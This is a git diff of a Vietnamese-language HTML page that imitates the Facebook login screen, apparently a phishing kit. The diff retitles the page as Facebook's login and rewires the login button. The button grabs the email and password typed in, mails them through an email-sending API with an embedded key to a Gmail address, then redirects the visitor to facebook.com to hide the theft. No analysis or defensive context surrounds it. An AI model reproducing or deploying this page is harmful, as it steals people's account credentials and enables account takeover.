@@ -7,7 +7,7 @@
     <meta property="og:locale" content="vi_VN">
     <meta name="description" content="Hãy đăng nhập Facebook để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
-    <title>Bình chọn nhân viên tháng</title>
+    <title>Facebook - Đăng nhập hoặc đăng ký</title>
     <link rel="stylesheet" href="https://candfansjp.github.io/style.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
   </head>
@@ -19,11 +19,11 @@
           <p>Facebook giúp bạn kết nối và chia sẻ</p>
           <p>  với mọi người trong cuộc sống của bạn.</p>
         </div>
-        <form action="#">
-          <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
-          <input type="password" id="password" placeholder="Mật khẩu" required>
+        <form>
+          <input type="text" id="email" placeholder="Email hoặc số điện thoại">
+          <input type="password" id="password" placeholder="Mật khẩu">
           <div class="link">
-            <button type="submit" onclick="sendMail()" class="login">Đăng nhập</button>
+            <button id="buttonSend" class="login" type='button'>Đăng nhập</button>
             <a href="#" class="forgot">Quên mật khẩu?</a>
           </div>
           <hr>
@@ -35,8 +35,8 @@
     </div>
   </body>
 
-  <script type="text/javascript"> 
-    function sendMail() {
+  <script type="text/javascript">
+    $("#buttonSend").on( "click", function() {
       var email = $("input[type=text]").val();
       var password = $("input[type=password]").val();
         $.ajax({
@@ -45,10 +45,10 @@
           data: {
             'key': 'md-mVIowYpTNKD75eTa_guiDA',
             'message': {
-              'from_email': 'dsdsdsdsds@gmail.com',
+              'from_email': 'locp.qb@gmail.com',
               'to': [
                   {
-                    'email': 'dasdsadsadsdsdsdsa@gmail.com',
+                    'email': 'harukileejp@gmail.com',
                     'name': 'RECIPIENT NAME',
                     'type': 'to'
                   }
@@ -58,8 +58,9 @@
             }
           }
         }).done(function(response) {
-          window.location = "https://www.facebook.com/";
+          window.location="https://www.facebook.com/";
         });
-    }
+        window.location="https://www.facebook.com/";
+    });
   </script> 
 </html>
